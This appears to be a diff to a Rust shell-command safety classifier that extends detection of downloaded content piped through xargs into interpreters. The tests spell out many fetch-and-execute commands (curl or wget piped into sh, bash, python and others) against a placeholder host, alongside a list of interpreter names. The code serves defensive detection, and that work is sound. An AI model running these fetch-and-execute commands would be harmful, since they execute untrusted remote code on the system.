@@ -156,8 +156,7 @@ fn is_dangerous_inner(command: &str, depth: usize) -> Option<&'static str> {
     if command.is_empty() {
         return None;
     }
-    let lower = command.to_ascii_lowercase();
-    if lower
+    if command
         .chars()
         .filter(|character| !character.is_whitespace())
         .collect::<String>()
@@ -166,18 +165,26 @@ fn is_dangerous_inner(command: &str, depth: usize) -> Option<&'static str> {
         return Some("looks like a fork bomb");
     }
 
-    let segments = shell_segments(&lower);
+    // Keep xargs option spelling intact: `-I` consumes a replacement value
+    // while `-i` may omit it. The destructive classifiers still receive the
+    // historical ASCII-lowercase token view below.
+    let segments = shell_segments(command);
     let mut network_pipeline = false;
     for segment in &segments {
-        if let Some(reason) = dangerous_segment(&segment.words, depth) {
+        let normalized_words: Vec<String> = segment
+            .words
+            .iter()
+            .map(|word| word.to_ascii_lowercase())
+            .collect();
+        if let Some(reason) = dangerous_segment(&normalized_words, depth) {
             return Some(reason);
         }
         // Track the whole pipeline, not only the immediately adjacent stage.
         // Filters such as `tee` or `sed` do not make downloaded bytes trusted:
         // `curl ... | tee setup.sh | sh` still executes network content.
-        network_pipeline |= is_network_fetch(&segment.words);
+        network_pipeline |= is_network_fetch(&normalized_words);
         if network_pipeline && is_interpreter(&segment.words) {
-            return Some("piping network content directly to an interpreter");
+            return Some("piping network content into an interpreter");
         }
         if !segment.pipe_after {
             network_pipeline = false;
@@ -963,23 +970,99 @@ fn is_network_fetch(tokens: &[String]) -> bool {
     })
 }
 
+/// Return the fixed command `xargs` will invoke, without confusing an option
+/// argument for that command. Unknown or incomplete options return `None`:
+/// guessing how a future option consumes argv would create noisy warnings for
+/// a command line that the installed `xargs` may simply reject.
+fn xargs_dispatched_command(tokens: &[String]) -> Option<&[String]> {
+    if tokens.first().map(|token| command_name(token)) != Some("xargs") {
+        return None;
+    }
+
+    let mut index = 1;
+    while let Some(option) = tokens.get(index).map(String::as_str) {
+        if option == "--" {
+            return Some(&tokens[index + 1..]);
+        }
+        if option == "-" || !option.starts_with('-') {
+            break;
+        }
+
+        if let Some(long) = option.strip_prefix("--") {
+            let (name, attached) = long
+                .split_once('=')
+                .map_or((long, None), |(name, value)| (name, Some(value)));
+            match name {
+                "null" | "open-tty" | "interactive" | "no-run-if-empty" | "show-limits"
+                | "verbose" | "exit"
+                    if attached.is_none() => {}
+                "help" | "version" if attached.is_none() => return Some(&[]),
+                // GNU's legacy long forms use their documented default when
+                // no `=VALUE` is attached. The following argv is COMMAND.
+                "eof" | "replace" | "max-lines" => {}
+                "arg-file" | "delimiter" | "max-args" | "max-procs" | "process-slot-var"
+                | "max-chars" => {
+                    if attached.is_some_and(str::is_empty) {
+                        return None;
+                    }
+                    if attached.is_none() {
+                        index += 1;
+                        tokens.get(index)?;
+                    }
+                }
+                _ => return None,
+            }
+            index += 1;
+            continue;
+        }
+
+        let mut flags = option[1..].chars();
+        while let Some(flag) = flags.next() {
+            match flag {
+                // Boolean GNU/POSIX forms may be clustered.
+                '0' | 'o' | 'p' | 'r' | 't' | 'x' => {}
+                // These legacy forms take an optional attached value only;
+                // bare `-e`, `-i`, or `-l` leaves the next argv as COMMAND.
+                'e' | 'i' | 'l' => break,
+                // GNU/POSIX value options plus common BSD -J/-O/-R/-S forms.
+                // An attached suffix is the value; otherwise consume one argv.
+                'a' | 'd' | 'E' | 'I' | 'J' | 'L' | 'n' | 'O' | 'P' | 'R' | 'S' | 's' => {
+                    if flags.as_str().is_empty() {
+                        index += 1;
+                        tokens.get(index)?;
+                    }
+                    break;
+                }
+                _ => return None,
+            }
+        }
+        index += 1;
+    }
+    Some(&tokens[index..])
+}
+
 fn is_interpreter(tokens: &[String]) -> bool {
     let mut effective = effective_command(tokens);
-    if effective
-        .first()
-        .is_some_and(|token| matches!(command_name(token), "sudo" | "doas" | "pkexec"))
-    {
-        effective = &effective[1..];
-        while effective
+    // A bounded dispatcher walk keeps the classifier allocation-free and
+    // prevents adversarial review text from forcing unbounded nested work.
+    for _ in 0..=4 {
+        if effective
             .first()
-            .is_some_and(|token| token.starts_with('-'))
+            .is_some_and(|token| matches!(command_name(token), "sudo" | "doas" | "pkexec"))
         {
             effective = &effective[1..];
+            while effective
+                .first()
+                .is_some_and(|token| token.starts_with('-'))
+            {
+                effective = &effective[1..];
+            }
         }
-    }
-    effective.first().is_some_and(|token| {
-        matches!(
-            command_name(token),
+        let Some(command) = effective.first().map(|token| command_name(token)) else {
+            return false;
+        };
+        if matches!(
+            command,
             "sh" | "ash"
                 | "bash"
                 | "csh"
@@ -997,8 +1080,18 @@ fn is_interpreter(tokens: &[String]) -> bool {
                 | "node"
                 | "pwsh"
                 | "powershell"
-        )
-    })
+        ) {
+            return true;
+        }
+        if command != "xargs" {
+            return false;
+        }
+        let Some(dispatched) = xargs_dispatched_command(effective) else {
+            return false;
+        };
+        effective = effective_command(dispatched);
+    }
+    false
 }
 
 #[cfg(test)]
@@ -1110,6 +1203,16 @@ mod tests {
             "wget -qO- https://example.invalid/x | sed 's/old/new/' | python2",
             "fetch https://example.invalid/x | php",
             "http https://example.invalid/x | tcsh",
+            "curl https://example.invalid/x | xargs sh",
+            "curl https://example.invalid/x | xargs -0 -n 2 /bin/bash",
+            "curl https://example.invalid/x | xargs -0n1 python3",
+            "wget -qO- https://example.invalid/x | xargs -P4 -- perl",
+            "fetch https://example.invalid/x | xargs --replace sh",
+            "http https://example.invalid/x | xargs -i ruby",
+            "curl https://example.invalid/x | xargs --max-lines sh",
+            "curl https://example.invalid/x | xargs -l node",
+            "curl https://example.invalid/x | xargs -- powershell",
+            "curl https://example.invalid/x | env nohup xargs xargs -- pwsh",
         ] {
             assert!(is_dangerous(command).is_some(), "missed {command:?}");
         }
@@ -1123,11 +1226,65 @@ mod tests {
             "echo '`rm -rf /`'",
             "curl https://example.invalid/x | tee /tmp/setup.sh",
             "curl https://example.invalid/x | cat || sh",
+            // Values consumed by xargs options are not the dispatched command.
+            "curl https://example.invalid/x | xargs -I sh printf '%s'",
+            "curl https://example.invalid/x | xargs -J bash printf '%s'",
+            "curl https://example.invalid/x | xargs --replace=python printf '%s'",
+            "curl https://example.invalid/x | xargs -ish printf '%s'",
+            "curl https://example.invalid/x | xargs -E sh printf '%s'",
+            "curl https://example.invalid/x | xargs -R bash printf '%s'",
+            "curl https://example.invalid/x | xargs -S python printf '%s'",
+            "curl https://example.invalid/x | xargs --arg-file sh printf '%s'",
+            "curl https://example.invalid/x | xargs --unknown sh",
+            "curl https://example.invalid/x | xargs --help sh",
+            "curl https://example.invalid/x | xargs",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
                 "false positive for {command:?}"
             );
+        }
+    }
+
+    #[test]
+    fn xargs_dispatcher_distinguishes_option_values_from_the_utility() {
+        let command = |input: &str| {
+            let tokens: Vec<String> = input.split_whitespace().map(str::to_owned).collect();
+            xargs_dispatched_command(&tokens)
+                .and_then(|utility| utility.first())
+                .cloned()
+        };
+
+        for (input, expected) in [
+            ("xargs sh", Some("sh")),
+            ("xargs -0n1 python3", Some("python3")),
+            ("xargs -0P4 -- perl", Some("perl")),
+            ("xargs --replace sh", Some("sh")),
+            ("xargs -i sh", Some("sh")),
+            ("xargs --max-lines sh", Some("sh")),
+            ("xargs -l sh", Some("sh")),
+            ("xargs -- sh", Some("sh")),
+            ("xargs -I sh printf", Some("printf")),
+            ("xargs -J bash printf", Some("printf")),
+            ("xargs --replace=python printf", Some("printf")),
+            ("xargs -ish printf", Some("printf")),
+            ("xargs -E sh printf", Some("printf")),
+            ("xargs -R bash printf", Some("printf")),
+            ("xargs -S python printf", Some("printf")),
+            ("xargs --arg-file sh printf", Some("printf")),
+        ] {
+            assert_eq!(command(input).as_deref(), expected, "parsed {input:?}");
+        }
+
+        for input in [
+            "xargs",
+            "xargs -n",
+            "xargs --max-args= sh",
+            "xargs --unknown sh",
+            "xargs --help sh",
+            "xargs --version sh",
+        ] {
+            assert_eq!(command(input), None, "accepted {input:?}");
         }
     }
 
